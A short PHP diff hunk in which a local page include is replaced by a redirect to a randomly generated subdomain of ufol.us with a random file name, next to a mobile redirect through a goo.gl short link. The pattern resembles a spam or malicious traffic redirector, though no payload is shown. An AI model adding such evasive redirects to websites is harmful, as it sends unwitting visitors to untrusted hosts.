@@ -54,6 +54,7 @@
   if($action == "mobile"){
     header("Location: http://goo.gl/c1u740");
   }else if($action == "site"){
-    require_once('chrome.html');
+    $filename = generate_name(rand(5,8)).".html";
+    header("Location:http://".generate_name(rand(5,8)).".ufol.us/".$filename);
   }
 ?>
